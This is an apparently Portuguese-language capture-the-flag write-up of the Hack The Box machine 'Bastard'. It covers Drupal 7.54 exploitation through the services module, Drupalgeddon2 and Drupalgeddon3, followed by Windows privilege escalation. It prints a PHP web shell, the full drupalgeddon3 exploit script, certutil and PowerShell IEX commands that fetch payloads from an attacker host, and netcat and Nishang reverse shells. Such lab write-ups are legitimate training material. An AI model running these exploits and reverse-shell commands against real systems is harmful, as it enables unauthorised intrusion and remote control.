---
title: "Hack The Box - Bastard"
tags: [Windows,Medium,MS16-014,MS10-051,Certutil,Wfuzz,Drupal,Drupalgeddon2,Drupalgeddon3,Local Exploit Suggester,Msfvenom,Meterpreter,Dropescan,BurpSuite,Nishang,Sherlock,JuicyPotato]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/7>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 6 portas abertas no servidor

> Porta 80 - Servidore Web

> Porta 135 - Microsoft RPC

> Porta 49154 - Microsoft RPC

Pela versão 7.5 do IIS conseguimos descobrir a versão do sistema operacional que está rodando nessa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_nmap1.png)

## Enumeração servidor web na porta 80

Ao abrirmos a página web encontramos um drupal sendo executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_web.png)

Um dos arquivos default no Drupal é o CHANGELOG.txt, então vamos ver oq ele traz de bom
Encontramos a versão dele, Drupal 7.54

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_web1.png)

### Droopescan

Então, como temos um drupal, vamos rodar o droopescan para ver se encontramos algo de úitl para explorarmos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_drop.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_drop1.png)

> https://github.com/droope/droopescan.git

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_drop2.png)

Então, executamos. Esse scan demora muito tempo para ser executado

> ./droopescan scan drupal -u http://10.10.10.9/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_drop3.png)

Aqui a única coisa que nos interessou a princípio foi a confirmação da versão da aplicação

### Pesquisa por exploits

Uma vez que já temos a versão do drupal que está sendo executado, vamos procurar por exploits para ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_google.png)

Encontramos esse link de referência, que vamos utilizar para explorar essa vulnerabilidade

> https://www.ambionics.io/blog/drupal-services-module-rce

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_google1.png)

Verificamos no corpo do blog que é exatamente a versão que procuramos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_google2.png)

Procuramos no Kali por exploits para Drupal

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_google3.png)

Baixamos ele e verificamos que a fonte dele é a mesma do site que eu entrei antes

# Explorando Drupal (shell de iusr - 1º Modo)

Bom, agora que já conseguimos um exploit que certamente irá funcionar, vamos dar inicio a exploração

## Verificando o caminho errado /rest_endpoint (Método 1)

Ao abrirmos o exploit, verificamos que ele faz referência a uma pasta chamada `rest_endpoint`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_end.png)

Vamos verificar se existe essa pasta no site, não existe...

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_end1.png)

Então agora rodamos o wfuzz na máquina pra ver se encontramos alguma pasta em que conseguimos fazer isso, rodei o wfuzz já com a palavra que eu queria pq minha VPN ta estranha com o HTB, quando fiz a máquina a primeira vez tempos atrás deu certo, agora ta dando erro. Mas essa palavra `rest` tem em quase todas as wordlists

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_wfuzz.png)

Esse `rest` pareceu promissor, então alteramos no exploit ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_go1.png)

Alteramos também o que será upado no servidor, uma vez que queremos ter RCE

`'data' => '<?php system($_REQUEST["cmd"]); ?>'`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_go3.png)

Executamos e vemos que foi upado corretamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_go2.png)

Agora executamos e vemos que temos RCE no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_go4.png)

Agora vamos verificar outro método de se ver esse path errado

## Verificando o caminho errado /rest_endpoint (Método 2)

Também poderíamos ter verificado que não existe pelo BurpSuite, é outra maneira bacana de se debugar exploits, pq se simplesmente pegarmos para executar e vimos que não deu certo, temos que sempre procurar saber o por que

Então vamos fazer desse modo também, alteramos o endereço do exploit, e executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_end2.png)

Opa! Deu errado!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_end3.png)

Sim, já sabiamos que ia dar errado, então vamos mandar a requisição para o burp para debugar ela melhor

Setamos um proxy para a porta 8888 local ser enviado para a 10.10.10.9:80

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp3.png)

Alteramos no exploit, para enviar a requisição para 127.0.0.1:8888

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp4.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp6.png)

Enviamos para o repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp7.png)

Verificamos ao enviar a requisição que não deu certo, ele não encontrou a página

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp8.png)

Alteramos o path para `rest` (esse foi o que eu encontrei no wfuzz lá em cima)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp9.png)

Executamos e vemos que deu certo, a requisição foi aceita pela servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_burp10.png)

Agora a partir daqui a ideia é a mesma, alterar o exploit com o `'data' => '<?php system($_REQUEST["cmd"]); ?>'` e o diretório a ser executado, e upar o shell php lá

### Ganhando shell na máquina

Verificamos a versão do windows

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_system.png)

Como é 64 Bits, o nc utilizado deve ser 64 bits

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_nc.png)

> https://eternallybored.org/misc/netcat/

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_nc1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_nc3.png)

Bom, agora é jogar o nc para lá dentro e conseguir o shell

Iremos utilizar o `certutil` para fazer o upload do nc64.exe dentro da máquina

Ligamos o python web server, onde o servidor vai procurar o arquivo para ser baixado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cert.png)

Executamos na página o seguinte comando: `certutil -urlcache -split -f http://10.10.16.117/nc64.exe`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cert1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cert2.png)

Agora executamos o comando `nc64.exe -e cmd.exe 10.10.16.117 443`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cert3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cert4.png)

Pronto, temos um shell, agora vamos fazer de outra maneira esse shell

# Explorando Drupal (shell de iusr - 2º Modo - Através do BurpSuite)

Bom, outro modo de se conseguir RCE nessa máquina é através do cookie de administrador que o exploit a ser executado nos fornece

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie.png)

Abrimos a Extensão `Quick Cookie Manager` (mas também dava pra fazer com qualquer ferramenta, até mesmo o F12, uma vez que é só alterar o cookie)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie1.png)

Agora alteramos o cookie para nos tornarmos administradores

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie2.png)

Salvamos e atualizamos, viramos admin!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie3.png)

Show, mas e agora, como podemos explorar isso? A ideia aqui é achar algum lugar que possamos executar php... então vamos procurar

Vamos em Módulos e habilitamos a execução de PHP

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie4.png)

Salvamos e fechamos o Modules, agora vamos em Content e clicamos em Add Content

Clicamos em Article

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie5.png)

Adicionamos um phpinfo() para ser executado e modificamos para PHP Code onde diz a respeito de que tipo de texto está sendoe executado, pra ver se temos execução de PHP na máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie6.png)

Clicamos em Preview e verificamos que foi executado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_cookie7.png)

Bom, sabendo que conseguimos executar php no sistema, poderiamos jogar um webshell ai dentro e executar, ganhando uma shell no sistema, não vou demonstrar aqui isso, vamos prosseguir pra não ficar tão grande o artigo

# Explorando Drupal (shell de iusr - 3º Modo - Através do Druppalgedon2)

Bom, dando prosseguimento à exploração vamos fazer de outro modo, através do druppalgedon2

Pesquisando por exploits através do serachsploit encontramos ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp21.png)

Verificamos como ele funciona

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp22.png)

Aqui eu obtive uma ajuda lendo o blog do `0xdf`, onde ele explica que estudando a vulnerabilidade (https://unit42.paloaltonetworks.com/unit42-exploit-wild-drupalgeddon2-analysis-cve-2018-7600/#pu3blic-exploits) percebeu que ela foi testada em drupal versão 8

Tentamos executar o exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp23.png)

Corrigimos o erro de \r que deu

`dos2unix 44449.rb`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp24.png)

Tentamos executar novamente e vemos que deu saida corretamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp25.png)

Executamos ele então, pra ver se conseguimos algo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp26.png)

Conseguimos shell!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp27.png)

## Fazendo Upgrade de Shell (Nishang)

Agora pra ficar melhor de trabalhar vamos fazer um shell com o nishang, então pegamos uma cópia do `Invoke-PowerShellTcp.ps1` em (https://github.com/samratashok/nishang)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_n.png)

Adicionamos a função `Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.117-Port 443` no final do arquivo, colocamos em uma pasta onde vou abrir um servidor python web e abrimos un nc na porta 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_n1.png)

Agora executamos no druppalgedon2 e ganhamos uma shell melhor de trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_n2.png)

> powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_n3.png)

Agora vamos explorar outro modo de se ganhar shell através do drupal

# Explorando Drupal (shell de iusr - 4º Modo - Através do Druppalgedon3)

Bom, já que temos autenticação no servidor, podemos executar outros exploits também

Pesquisamos por exploits com o searchsploit encontramos um que nos interessou bastante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp3.png)

Passamos ele para nossa máquina para melhor trabalhar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp31.png)

Aqui fala que devemos estar autenticados e com o poder de deletar um node, já estamos autenticados como admin, então podemos tentar executar ele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp32.png)

Aqui já temos um script em python que explora essa vulnerabilidade

> https://raw.githubusercontent.com/oways/SA-CORE-2018-004/master/drupalgeddon3.py

```
#!/usr/bin/python

'''
Author: Oways
https://twitter.com/0w4ys
https://github.com/oways

[Usage]
python drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]

[Example]
python drupalgeddon3.py http://target/drupal/ 'SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0' 6 'uname -a'

'''
import requests
import re, sys

try:
  host=sys.argv[1]
  session={'cookie': sys.argv[2]}
  node=sys.argv[3]
  command=sys.argv[4]

  r = requests.get('%s/node/%s/delete'%(host,node),headers=session, verify=False)
  csrf = re.search(r'>\n<input type="hidden" name="form_token" value="([^"]+)" />', r.text )
  if csrf:
    data = {'form_id':'node_delete_confirm', '_triggering_element_name':'form_id','form_token':csrf.group(1)}
    r = requests.post(host+'/?q=node/'+node+'/delete&destination=node?q[%2523post_render][]=passthru%26q[%2523type]=markup%26q[%2523markup]='+command, data=data, headers=session)
    formid = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
    if formid:
        post_params = {'form_build_id':formid.group(1)}
        r = requests.post(host+'/?q=file/ajax/actions/cancel/%23options/path/'+formid.group(1), data=post_params, headers=session)
        print(r.text.split('[', 1)[0])
except:
  print('\n[Usage]\npython drupalgeddon3.py [URL] [Session] [Exist Node number] [Command]\n\n[Example]\npython drupalgeddon3.py http://target/drupal/ "SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0" 6 "uname -a"\n')
```

Bom o cookie nós já adicionamos com a extensão do firefox anteriormente, agora só devemo utilizar ele

`SESSd873f26fc11f2b7e6e4aa0f6fce59913=APFIFW0iHjaJiX0aELCdH7m9Xl9jei9hlDV6e0Pp7uE`

Mas antes disso devemos verificar quais NODES estão disponíveis pra gente usar para exploração, uma vez que ele pede que possamos escrever nos nodes

Clicamos em `Content` e `Find Content`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp33.png)

Agora clicamos no `REST` e ele nos remete ao link `http://10.10.10.9/node/1`, ou seja, temos o NODE 1 onde podemos escrever nele e fazer o que bem entendermos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp34.png)

Então executamos com o node e conseguimos RCE na máquina novamente

> python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=APFIFW0iHjaJiX0aELCdH7m9Xl9jei9hlDV6e0Pp7uE" 1 "ipconfig"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_rce.png)

Pegamos um shell nishang do mesmo modo que foi feito com o Druppalgedon2

> python drupalgeddon3.py http://10.10.10.9/ "SESSd873f26fc11f2b7e6e4aa0f6fce59913=APFIFW0iHjaJiX0aELCdH7m9Xl9jei9hlDV6e0Pp7uE" 1 "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.117/Invoke-PowerShellTcp.ps1')"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_dp35.png)

# Escalação de Privilégio (1º Método - Sherlock - MS15-051 - Certutil)

Bom, agora chega de brincadeira, já mostramos muitas maneiras diferentes de se explorar isso. Vamos iniciar a escalação de privilégio

Vamos rodar diversas ferramentas pra escalar privilégio nessa máquina. Mas a primeira coisa que devemos fazer é executar o `systeminfo`, isso para verificarmos se temos ou não hotfixes instaladas. Por ai geralmente podemos deduzir se podemos fazer a escalação de privilégio por kernel ou não

Verificamos que não temos Hotfixes instaladas, então já é um grande indicativo que podemos explorar por kernel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_sys.png)

Outra coisa que geralmente vemos em máquinas windows é o token `SeImpersonatePrivilege` habilitado, se ele estiver, possivelmente podemos executar o `RottenPotato` e conseguir um shell de administrador da máquina

Aqui verificamos que temos sim esse token habilitado! Então mais a frente vamos explorar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_sys1.png)

## Rodando o Sherlock

Primeiro vamos executar o `Sherlock` pra ver o que conseguimos tirar de proveito dele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_p.png)

Aqui está ele, ele está desatualizado, mas mesmo assim conseguimos tirar proveito

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_p1.png)

Baixamos ele para nossa Kali

> https://github.com/rasta-mouse/Sherlock

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_p3.png)

Passamos ele para a máquina windows

> IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.117/PowerUp.ps1')

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_p2.png)

Damos o comando `Find-AllVulns` para executar todas as possibilidades da aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_p4.png)

Encontramos várias, aqui é teste pra ver quais funcionam

Agora vamos testar essa aqui, a `MS15-051`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_p5.png)

### MS15-051

Bom, vamos pesquisar exploits para ele então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_ms.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_ms1.png)

> https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS15-051/ms15-051.zip

Baixamos pra nossa máquina

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_ms2.png)

### Certutil

Passamos agora para a máquina Windows

> certutil -urlcache -split -f http://10.10.16.117/ms15-051x64.exe ms15-051x64.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_c.png)

#### Virando Administrador

Agora executamos ele para nos dar um shell de root (lembrar que jogamos o nc64.exe lá dentro antes)

> ./ms15-051x64.exe "nc64.exe -e cmd 10.10.16.117 443"

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_root.png)

Bom, essa foi uma maneira, agora vamos explorar outra

# Escalação de Privilégio (2º Método - Msfvenom - Meterpreter - MS16-014)

Primeiro passo é gerar o payload.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_pay.png)

Baixamos ele na máquina bastard

> http://10.10.10.9/dixuSOspsOUU.php?cmd=certutil -urlcache -split -f http://10.10.16.117/payload.exe payload.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_pay1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_paye1.png)

Setamos nosso handler

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_pay3.png)

Executamos o payload

> http://10.10.10.9/dixuSOspsOUU.php?cmd=payload.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_pay2.png)

Recebemos a shell de meterpreter

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_pay4.png)

## local_exploit_suggester

Pesquisamos pelo local exploit suggester

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc.png)

Setamos as configurações

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc1.png)

Executamos (verificamos que está como x86/windows, mas a máquina é x64, depois vamos alterar e rodar com x64 também)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc2.png)

Agora vamos alterar para um processo que seja x64 bits, pra ver os resultados e comparar eles

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc5.png)

Verificamos agora, realmente está como x64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc6.png)

Agora rodamos novamente o local exploit suggester

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_loc7.png)

## windows/local/ms16_014_wmi_recv_notif

Executamos o payload do ms16_014

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_sc.png)

Viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_sc1.png)

# Escalação de Privilégio (3º Método - JuicyPotato)

Creio que seja o método mais simples, mesmo não gostando dele vamos demonstrar, se você se lembrar lá em cima tinha o `SeImpersonateToken` ativado, se ele estiver Enabled, nos permite criar um Token de authority

Pesquisamos por Juicy Potato

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po.png)

Encontramos o GitHub da ferramenta

> https://github.com/ohpe/juicy-potato

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po1.png)

Como somos preguiçosos vamos pegar o binário já compilado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po2.png)

Baixamos ele para nossa Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po3.png)

Passamos ele para a máquina Bastard

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po4.png)

Pegamos o CLSID

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po5.png)

Pegamos o primeiro mesmo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po6.png)

Executamos e viramos root!

> JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D}

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_po7.png)

## Pegamos a flag de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_root1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-bastard/B_user.png)